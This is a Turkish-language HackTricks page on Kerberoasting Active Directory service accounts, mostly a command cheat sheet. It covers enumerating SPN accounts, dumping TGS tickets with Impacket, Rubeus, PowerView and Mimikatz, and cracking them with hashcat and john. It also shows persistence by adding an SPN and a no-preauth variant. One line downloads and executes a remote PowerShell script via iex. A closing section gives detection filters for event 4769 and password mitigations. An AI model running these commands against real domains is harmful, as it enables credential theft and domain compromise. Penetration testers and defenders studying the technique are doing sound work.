# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting, **Active Directory (AD)** altında çalışan **kullanıcı hesapları** ile ilgili olan **TGS biletlerinin** edinilmesine odaklanır; **bilgisayar hesapları** hariçtir. Bu biletlerin şifrelemesi, **kullanıcı şifrelerinden** kaynaklanan anahtarları kullanır ve bu da **çevrimdışı kimlik bilgisi kırma** olasılığını sağlar. Bir kullanıcı hesabının hizmet olarak kullanıldığı, boş olmayan bir **"ServicePrincipalName"** özelliği ile belirtilir.

**Kerberoasting** gerçekleştirmek için, **TGS biletleri** talep edebilen bir alan hesabı gereklidir; ancak bu süreç **özel ayrıcalıklar** talep etmez, bu da **geçerli alan kimlik bilgilerine** sahip olan herkesin erişimine açık olduğu anlamına gelir.

### Ana Noktalar:

- **Kerberoasting**, **AD** içindeki **kullanıcı-hesap hizmetleri** için **TGS biletlerini** hedef alır.
- **Kullanıcı şifrelerinden** gelen anahtarlarla şifrelenmiş biletler **çevrimdışı** kırılabilir.
- Bir hizmet, null olmayan bir **ServicePrincipalName** ile tanımlanır.
- **Özel ayrıcalıklar** gerekmez, sadece **geçerli alan kimlik bilgileri** yeterlidir.

### **Saldırı**

> [!WARNING]
> **Kerberoasting araçları**, saldırıyı gerçekleştirirken ve TGS-REQ isteklerini başlatırken genellikle **`RC4 şifrelemesi`** talep eder. Bunun nedeni, **RC4'ün** [**daha zayıf**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) olması ve Hashcat gibi araçlar kullanılarak çevrimdışı kırılmasının diğer şifreleme algoritmaları olan AES-128 ve AES-256'dan daha kolay olmasıdır.\
> RC4 (tip 23) hash'leri **`$krb5tgs$23$*`** ile başlarken, AES-256 (tip 18) **`$krb5tgs$18$*`** ile başlar.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Kerberoastable kullanıcıların dökümünü içeren çok özellikli araçlar:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Kerberoastable kullanıcıları listele**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Teknik 1: TGS isteyin ve bellekten dökün**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Teknik 2: Otomatik araçlar**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Bir TGS talep edildiğinde, Windows olayı `4769 - A Kerberos service ticket was requested` oluşturulur.

### Kırma
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Süreklilik

Eğer bir kullanıcı üzerinde **yeterli izinleriniz** varsa, onu **kerberoastable** hale getirebilirsiniz:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Burada **kerberoast** saldırıları için faydalı **araçlar** bulabilirsiniz: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Eğer Linux'tan bu **hata** ile karşılaşırsanız: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** bu, yerel saatinizle ilgilidir, hostu DC ile senkronize etmeniz gerekir. Birkaç seçenek var:

- `ntpdate <DC'nin IP'si>` - Ubuntu 16.04 itibarıyla kullanımdan kaldırılmıştır
- `rdate -n <DC'nin IP'si>`

### Mitigation

Kerberoasting, eğer istismar edilebiliyorsa, yüksek bir gizlilik derecesi ile gerçekleştirilebilir. Bu aktiviteyi tespit etmek için **Security Event ID 4769**'a dikkat edilmelidir; bu, bir Kerberos biletinin talep edildiğini gösterir. Ancak, bu olayın yüksek sıklığı nedeniyle, şüpheli aktiviteleri izole etmek için belirli filtreler uygulanmalıdır:

- Hizmet adı **krbtgt** olmamalıdır, çünkü bu normal bir taleptir.
- **$** ile biten hizmet adları, hizmetler için kullanılan makine hesaplarını dahil etmemek için hariç tutulmalıdır.
- Makinalardan gelen talepler, **machine@domain** formatındaki hesap adları hariç tutularak filtrelenmelidir.
- Sadece başarılı bilet talepleri dikkate alınmalıdır; bunlar **'0x0'** hata kodu ile tanımlanır.
- **En önemlisi**, bilet şifreleme türü **0x17** olmalıdır; bu, genellikle Kerberoasting saldırılarında kullanılır.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Kerberoasting riskini azaltmak için:

- **Hizmet Hesabı Parolalarının tahmin edilmesi zor olmasını** sağlayın, **25 karakterden** uzun bir uzunluk önerilmektedir.
- **Yönetilen Hizmet Hesaplarını** kullanın; bu, **otomatik parola değişiklikleri** ve **devredilmiş Hizmet Prensip Adı (SPN) Yönetimi** gibi avantajlar sunarak bu tür saldırılara karşı güvenliği artırır.

Bu önlemleri uygulayarak, organizasyonlar Kerberoasting ile ilişkili riski önemli ölçüde azaltabilir.

## Kerberoast w/o domain account

**Eylül 2022**'de, Charlie Clark adında bir araştırmacı tarafından bir sistemin istismar edilmesi için yeni bir yol ortaya çıkarıldı ve bu, kendi platformu [exploit.ph](https://exploit.ph/) üzerinden paylaşıldı. Bu yöntem, herhangi bir Active Directory hesabı üzerinde kontrol gerektirmeden **KRB_AS_REQ** isteği aracılığıyla **Hizmet Biletleri (ST)** edinilmesine olanak tanır. Temelde, bir prensip, ön kimlik doğrulama gerektirmeyecek şekilde ayarlandığında—siber güvenlik alanında **AS-REP Roasting saldırısı** olarak bilinen bir senaryoya benzer—bu özellik, istek sürecini manipüle etmek için kullanılabilir. Özellikle, isteğin gövdesindeki **sname** niteliğini değiştirerek, sistemin standart şifreli Bilet Verme Bileti (TGT) yerine bir **ST** vermesi sağlanır.

Teknik, bu makalede tam olarak açıklanmaktadır: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> Bu teknikle LDAP'ı sorgulamak için geçerli bir hesabımız olmadığından, bir kullanıcı listesi sağlamalısınız.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus PR #139'dan](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Referanslar

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
